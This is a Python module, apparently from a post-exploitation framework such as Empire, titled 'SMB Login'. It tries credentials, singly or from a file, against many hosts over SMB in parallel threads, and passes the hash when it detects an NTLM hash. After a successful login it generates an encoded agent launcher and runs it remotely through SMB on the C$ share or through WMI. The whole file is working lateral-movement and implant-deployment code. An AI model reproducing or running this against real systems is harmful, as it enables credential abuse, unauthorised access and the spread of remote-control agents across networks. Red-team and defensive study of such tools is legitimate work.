from lib.common.helpers import *
from lib.common.smbmap import SMBMap
from lib.common.wmiexec import WMIEXEC
from time import sleep

from Queue import Queue
from threading import Thread
from subprocess import Popen

import threading

class Module:
    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'SMB Login',
            'Author': ['@coryduplantis'],
            'Description': ('Attempts to login to hosts using SMB'),
            'Background' : False,
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'OutputExtension' : '',
            'MinPSVersion' : '2',
            'Comments': [
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'username' : {
                'Description'   :   'Username to attempt to login as',
                'Required'      :   False,
                'Value'         :   ''
            },
            'password' : {
                'Description'   :   'Password to attempt to login with',
                'Required'      :   False,
                'Value'         :   ''
            },
            'domain' : {
                'Description'   :   'Domain to attempt to login on',
                'Required'      :   False,
                'Value'         :   'WORKGROUP'
            },
            'userpassFile' : {
                'Description'   :   'One username/password combo per line, seperated by space',
                'Required'      :   False,
                'Value'         :   ''
            },
            'rhosts' : {
                'Description'   :   'Hosts to authticate to. If multiple, seperate by a space. If none, will use all hosts from `hosts` table',
                'Required'      :   False,
                'Value'         :   ''
            },
            'listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'method' : {
                'Description'   :   'Method to deploy: SMB, WMI',
                'Required'      :   True,
                'Value'         :   'WMI'
            },
            'proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'proxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'userAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'threads' : {
                'Description'   :   'Number of Python threads to execute with',
                'Required'      :   False,
                'Value'         :   '1'
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def validate_options(self):
        for option,values in self.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                print error("[!] Error: Required module option missing.")
                return False
        return True

    def test_thread(self, host, username, password, domain):
        print host, username, password, domain

    def attempt_deploy(self, host, username, password, domain):
        info("Thread starting: {}".format(host))
        smb = SMBMap()
        pass_the_hash = False

        method = self.options['method']['Value']
        listener = self.options['listener']['Value']
        proxy_creds = self.options['proxyCreds']['Value']
        proxy = self.options['proxy']['Value']
        user_agent = self.options['userAgent']['Value']

        if ':' in password\
            and len(password.split(':')[0]) == len(password.split(':')[1]) == 32\
            and domain.lower() != 'workgroup':
            pass_the_hash = True
            success("Attempting to pass-the-hash for domain. If local admin, change domain to workgroup")

        # Don't retry to login if tried once
        """
        if (domain, username, password, host) in cache:
            output("Already tried logging in with {}:{}@{}, skipping".format(username, password, host))
            continue
        """

        smb.hosts[host] = {'port':445, 'user':username, 'passwd':password, 'domain':domain}
        if pass_the_hash:
            result = smb.login_hash(host, username, password, domain)
        else:
            result = smb.login(host, username, password, domain)

        conn_info = '{}\{}:{}@{}'.format(domain, username, password, host)
        if result:
            success('Successful authentication: {}'.format(conn_info))
            share = 'C$'
            # generate the launcher code
            command = self.mainMenu.stagers.generate_launcher(listener, encode=True, userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds)
            warning("Sending agent...")

            try:
                access = ''
                if method.lower() == 'smb':
                    result = smb.exec_command(host, share, command, False, execute_only=True)
                    if 'ACCESS_DENIED' in str(result).upper():
                        output("Failed execution: {}".format(conn_info))
                        access = 'Guest'
                    else:
                        success("Successful execution: {}".format(conn_info))
                        access = 'Local Admin'
                elif method.lower() == 'wmi':
                    wmi = WMIEXEC(command, username, password, domain, hashes=None, aesKey=False, share=share, noOutput=True, doKerberos=False)
                    result = wmi.run(host)
                    access = 'Local Admin'
            except:
                import traceback; traceback.print_exc()

        else:
            info('Failed authentication: {}'.format(conn_info))
            access = 'None'

        info("Adding target")
        self.mainMenu.targets.add_target(target=host, username=username, password=password, domain=domain, access=access)
        info("Thread done: {}".format(host))

    def execute(self):
        if not self.validate_options():
            return

        username = self.options['username']['Value']
        password = self.options['password']['Value']
        domain = self.options['domain']['Value']
        userpassFile = self.options['userpassFile']['Value']
        rhosts = self.options['rhosts']['Value']
        threads = int(self.options['threads']['Value'])

        creds = []

        if userpassFile:
            if not os.path.exists(userpassFile):
                self.error("File does not exist: {}".format(userpassFile))
                return

            with open(userpassFile, 'r') as f:
                creds = f.read().splitlines()

            creds = [line.split() for line in creds]

        if not username and not password and not userpassFile:
            creds += [('', '')]

        if username and password:
            creds += [(username, password)]

        if ' ' in rhosts or ',' in rhosts:
            rhosts = rhosts.replace(',', ' ').split()
        elif rhosts:
            rhosts = [rhosts]
        else:
            rhosts = [target[0] for target in self.mainMenu.query("SELECT target FROM targets")]

        cache = self.mainMenu.query("SELECT domain,username,password,target FROM targets")

        try:
            args = []

            def do_thread(q):
                while True:
                    creds = q.get()
                    self.attempt_deploy(*creds)
                    q.task_done()
            
            q = Queue(maxsize=0)
            num_threads = threads
            
            for i in range(num_threads):
                worker = Thread(target=do_thread, args=(q,))
                worker.start()
            
            for username, password in creds:
                for host in rhosts:
                    q.put((host, username, password, domain))

            info("Waiting for all threads to finish")
            q.join()

        except:
            import traceback; traceback.print_exc()
